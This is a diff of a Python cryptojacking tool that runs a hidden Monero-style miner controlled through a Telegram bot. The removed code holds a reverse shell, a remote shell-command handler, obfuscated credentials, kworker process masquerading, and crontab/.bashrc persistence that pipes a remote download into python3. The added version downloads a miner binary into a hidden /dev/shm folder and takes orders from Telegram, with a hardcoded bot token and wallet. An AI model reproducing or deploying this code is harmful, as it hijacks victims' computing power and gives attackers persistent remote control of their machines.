@@ -1,229 +1,174 @@
-"""
-FORGE.PY - Upgraded ForeverMiner with Telegram Command & Control
-Author: 🔥 Your Miner Blacksmith
-"""
+# forge.py — Final Stealth Mining Controller
 
 import os
-import sys
 import subprocess
+import requests
+import json
+import telebot
 import time
 import threading
-import base64
-import requests
-import hashlib
 import socket
-import uuid
-import platform
-import codecs
-import json
+from datetime import datetime
 
-# === CONFIG LOADING ===
-def obf_decode(obf):
-    return codecs.decode(base64.b64decode(obf).decode(), "rot_13")
+# === USER CONFIG ===
+BOT_TOKEN = '7987532893:AAGvwCj4X83Qr5IFYyk3GeO3synDYR5Xh4Y'
+ADMIN_ID = 7285391034  # Replace with your actual Telegram ID
+CONFIG_FILE = os.path.expanduser("~/.forge_config.json")
+LOG_FILE = "/tmp/miner.log"
+MINER_NAME = "bioscheck"
+MINER_PATH = "/dev/shm/.cache-{}/bioscheck".format(os.urandom(3).hex())
+B64_URL = "https://raw.githubusercontent.com/Anderson816/foreverminer/main/forever.b64"
+DEFAULT_POOL = "fr.zephyr.herominers.com:1123"
 
-WALLET = obf_decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=")
-BOT_TOKEN = obf_decode("Nzk4NzUzMjg5MzpOTlRpalB3NEs4M0RlNVZTTGx4M1RyQjNmbGFRTEU1S3U0TA==")
-CHAT_ID = obf_decode("NzI4NTM5MTAzNA==")
-B64_URL = obf_decode("dWdnY2Y6Ly9lbmoudHZndWhvaGZyZXBiYWdyYWcucGJ6L05hcXJlZmJhODE2L3NiZXJpcmV6dmFyZS9lcnNmL3VybnFmL3pudmEvc2JlcmlyZS5vNjQ=")
-POOL = obf_decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=")
+bot = telebot.TeleBot(BOT_TOKEN)
 
-COIN = "Zeph"
-WORKER_NAME = "A0"
-MINER_NAME = f"[kworker/{uuid.uuid4().hex[:4]}-events_power]"
-CHECK_INTERVAL = 5
-REVERSE_SHELL_IP = "127.0.0.1"
-REVERSE_SHELL_PORT = 4444
-ENABLE_REVERSE = True
+# === CONFIG HANDLER ===
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, 'r') as f:
+            return json.load(f)
+    else:
+        return {
+            "wallet": "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b",
+            "worker": "A0",
+            "threads": 4,
+            "pool": DEFAULT_POOL
+        }
 
-IS_LINUX = "linux" in platform.system().lower()
-IS_WINDOWS = "windows" in platform.system().lower()
-IS_ANDROID = "android" in platform.platform().lower()
+def save_config(cfg):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(cfg, f)
 
-from multiprocessing import cpu_count
+config = load_config()
 
-# === PATH SETUP ===
-tempdir = os.path.join("/dev/shm" if IS_LINUX else os.getenv("APPDATA", "/tmp"), f".cache-{uuid.uuid4().hex[:6]}")
-os.makedirs(tempdir, exist_ok=True)
-miner_path = os.path.join(tempdir, "bioscheck")
-
-# === TELEGRAM ===
-def tg(msg):
+# === MINER FUNCTIONS ===
+def fetch_and_decode_miner():
     try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                      data={"chat_id": CHAT_ID, "text": msg})
-    except:
-        pass
-
-def tg_file(filepath):
-    try:
-        with open(filepath, "rb") as f:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                          data={"chat_id": CHAT_ID}, files={"document": f})
-    except:
-        pass
-
-# === SYSTEM INFO ===
-def get_ip():
-    try: return requests.get("https://api.ipify.org").text.strip()
-    except: return "unknown"
-
-def get_gpu():
-    try:
-        out = subprocess.check_output(
-            "nvidia-smi --query-gpu=name,utilization.gpu --format=csv,noheader,nounits",
-            shell=True)
-        return out.decode().strip()
-    except:
-        return "None"
-
-def get_cpu_usage():
-    try:
-        out = subprocess.check_output("top -bn1 | grep 'Cpu(s)'", shell=True).decode()
-        usage = out.split('%')[0].split()[-1]
-        return f"{usage}%"
-    except:
-        return "unknown"
-
-def get_uptime():
-    try:
-        with open("/proc/uptime") as f:
-            secs = int(float(f.read().split()[0]))
-            m, s = divmod(secs, 60)
-            h, m = divmod(m, 60)
-            return f"{h}h {m}m"
-    except:
-        return "unknown"
-
-def get_fingerprint():
-    h = hashlib.sha256()
-    h.update((socket.gethostname() + str(uuid.getnode())).encode())
-    return h.hexdigest()[:20]
+        data = requests.get(B64_URL).content
+        binary = base64.b64decode(data)
+        os.makedirs(os.path.dirname(MINER_PATH), exist_ok=True)
+        with open(MINER_PATH, 'wb') as f:
+            f.write(binary)
+        os.chmod(MINER_PATH, 0o755)
+    except Exception as e:
+        return str(e)
 
 def is_miner_running():
-    return subprocess.getoutput(f"pgrep -f '{miner_path}'") != ''
-
-# === TELEGRAM COMMAND HANDLER ===
-def tg_report(status="🧬 FOREVERMINER ONLINE"):
-    msg = f"""{status}
-Host: {socket.gethostname()}
-IP: {get_ip()}
-Coin: {COIN}
-Wallet: {WALLET}
-Worker: {WORKER_NAME}
-CPU: {get_cpu_usage()}
-GPU: {get_gpu()}
-Uptime: {get_uptime()}
-Fingerprint: {get_fingerprint()}
-Process: {MINER_NAME}
-"""
-    tg(msg)
-
-def handle_command(cmd):
-    if cmd == "/status":
-        tg_report("📊 Status Report")
-    elif cmd == "/stop":
-        subprocess.call(f"pkill -f '{miner_path}'", shell=True)
-        tg("⛔ Miner stopped.")
-    elif cmd == "/start":
-        if is_miner_running():
-            tg("✅ Miner already running.")
-        else:
-            decode_and_run()
-    elif cmd == "/restart":
-        subprocess.call(f"pkill -f '{miner_path}'", shell=True)
-        time.sleep(2)
-        decode_and_run()
-    elif cmd.startswith("/shell"):
-        try:
-            out = subprocess.check_output(cmd[len("/shell"):].strip(), shell=True).decode()
-            tg(out[:4096])
-        except Exception as e:
-            tg(f"Shell Error: {e}")
-    elif cmd == "/help":
-        tg("""⚙ Available Commands:
-/status – miner status
-/start – start miner
-/stop – stop miner
-/restart – restart miner
-/shell <cmd> – run shell command
-/help – this list""")
-
-def tg_poll():
-    offset = None
-    while True:
-        try:
-            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"timeout": 30, "offset": offset})
-            data = r.json()
-            for update in data.get("result", []):
-                offset = update["update_id"] + 1
-                if "message" in update:
-                    msg = update["message"]
-                    if str(msg.get("chat", {}).get("id")) == CHAT_ID:
-                        txt = msg.get("text", "")
-                        handle_command(txt.strip())
-        except:
-            pass
-        time.sleep(5)
-
-# === MINER EXECUTION ===
-def decode_and_run():
     try:
-        b64 = requests.get(B64_URL).text
-        raw = base64.b64decode(b64)
-        with open(miner_path, "wb") as f:
-            f.write(raw)
-        os.chmod(miner_path, 0o755)
+        out = subprocess.check_output(["pgrep", "-f", MINER_NAME])
+        return True
+    except subprocess.CalledProcessError:
+        return False
 
-        cores = cpu_count()
-        cmd = f"nice -n -20 taskset -c 0-{cores-1} {miner_path} --donate-level=0 --threads={cores} -o {POOL} -u {WALLET} -p x --coin {COIN.lower()} --tls"
-        subprocess.Popen(f"exec -a '{MINER_NAME}' {cmd}", shell=True,
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        tg_report()
-    except Exception as e:
-        tg(f"❌ Miner setup failed: {str(e)}")
-
-# === WATCHDOG ===
-def watchdog():
-    while True:
-        if not is_miner_running():
-            tg("⚠️ Miner killed. Restarting...")
-            decode_and_run()
-        time.sleep(CHECK_INTERVAL)
-
-# === REVERSE SHELL ===
-def reverse_shell():
-    if not ENABLE_REVERSE:
+def start_miner():
+    if is_miner_running():
         return
-    try:
-        s = socket.socket()
-        s.connect((REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        subprocess.call(["/bin/bash", "-i"])
-    except:
-        pass
+    fetch_and_decode_miner()
+    cmd = f"exec -a {MINER_NAME} {MINER_PATH} --donate-level=0 --threads={config['threads']} -o {config['pool']} -u {config['wallet']}.{config['worker']} -p x --coin zeph --tls"
+    with open(LOG_FILE, "w") as log:
+        subprocess.Popen(cmd, shell=True, stdout=log, stderr=log)
 
-# === PERSISTENCE ===
-def setup_persistence():
-    try:
-        cronline = f'@reboot curl -s {B64_URL} | base64 -d | python3\n'
-        subprocess.call(f'(crontab -l 2>/dev/null; echo "{cronline}") | crontab -', shell=True)
-    except:
-        pass
-    try:
-        bashrc = os.path.expanduser("~/.bashrc")
-        with open(bashrc, "a") as f:
-            f.write(f'curl -s {B64_URL} | base64 -d | python3 &\n')
-    except:
-        pass
+def stop_miner():
+    subprocess.call(["pkill", "-f", MINER_NAME])
 
-# === LAUNCH ===
-threading.Thread(target=watchdog, daemon=True).start()
-threading.Thread(target=reverse_shell, daemon=True).start()
-threading.Thread(target=tg_poll, daemon=True).start()
-setup_persistence()
-decode_and_run()
+def get_hashrate():
+    if not os.path.exists(LOG_FILE):
+        return "No logs."
+    with open(LOG_FILE, 'r') as f:
+        lines = f.readlines()
+    for line in reversed(lines):
+        if "speed" in line:
+            return line.strip()
+    return "No hashrate found."
 
+def get_status():
+    ip = socket.gethostbyname(socket.gethostname())
+    uptime = subprocess.check_output("uptime -p", shell=True).decode().strip()
+    running = "Yes" if is_miner_running() else "No"
+    return f"💠 <b>Status</b>\nMiner: <code>{running}</code>\nIP: <code>{ip}</code>\nUptime: <code>{uptime}</code>\nWorker: <code>{config['worker']}</code>\nThreads: <code>{config['threads']}</code>\nPool: <code>{config['pool']}</code>"
+
+# === TELEGRAM COMMANDS ===
+
+def is_admin(msg):
+    return msg.from_user.id == ADMIN_ID
+
+@bot.message_handler(commands=['start'])
+def cmd_start(msg):
+    if is_admin(msg):
+        start_miner()
+        bot.reply_to(msg, "🚀 Miner started.")
+
+@bot.message_handler(commands=['stop'])
+def cmd_stop(msg):
+    if is_admin(msg):
+        stop_miner()
+        bot.reply_to(msg, "🛑 Miner stopped.")
+
+@bot.message_handler(commands=['status'])
+def cmd_status(msg):
+    if is_admin(msg):
+        bot.reply_to(msg, get_status(), parse_mode="HTML")
+
+@bot.message_handler(commands=['log'])
+def cmd_log(msg):
+    if is_admin(msg):
+        if not os.path.exists(LOG_FILE):
+            bot.reply_to(msg, "No log file found.")
+            return
+        with open(LOG_FILE) as f:
+            lines = f.readlines()[-20:]
+        bot.reply_to(msg, "<code>{}</code>".format(''.join(lines[-20:])), parse_mode="HTML")
+
+@bot.message_handler(commands=['speed'])
+def cmd_speed(msg):
+    if is_admin(msg):
+        bot.reply_to(msg, get_hashrate())
+
+@bot.message_handler(commands=['setworker'])
+def cmd_setworker(msg):
+    if is_admin(msg):
+        parts = msg.text.strip().split()
+        if len(parts) != 2:
+            bot.reply_to(msg, "Usage: /setworker <name>")
+            return
+        config['worker'] = parts[1]
+        save_config(config)
+        bot.reply_to(msg, f"✅ Worker set to: <code>{parts[1]}</code>", parse_mode="HTML")
+
+@bot.message_handler(commands=['wallet'])
+def cmd_wallet(msg):
+    if is_admin(msg):
+        parts = msg.text.strip().split()
+        if len(parts) != 2:
+            bot.reply_to(msg, "Usage: /wallet <address>")
+            return
+        config['wallet'] = parts[1]
+        save_config(config)
+        bot.reply_to(msg, f"✅ Wallet set.")
+
+@bot.message_handler(commands=['threads'])
+def cmd_threads(msg):
+    if is_admin(msg):
+        parts = msg.text.strip().split()
+        if len(parts) != 2 or not parts[1].isdigit():
+            bot.reply_to(msg, "Usage: /threads <count>")
+            return
+        config['threads'] = int(parts[1])
+        save_config(config)
+        bot.reply_to(msg, f"✅ Threads set to: {parts[1]}")
+
+@bot.message_handler(commands=['updateb64'])
+def cmd_updateb64(msg):
+    if is_admin(msg):
+        stop_miner()
+        time.sleep(1)
+        fetch_and_decode_miner()
+        start_miner()
+        bot.reply_to(msg, "♻️ Miner updated and restarted.")
+
+# === START TELEGRAM LOOP ===
+threading.Thread(target=bot.infinity_polling, daemon=True).start()
+
+# === IDLE KEEP-ALIVE ===
 while True:
     time.sleep(3600)
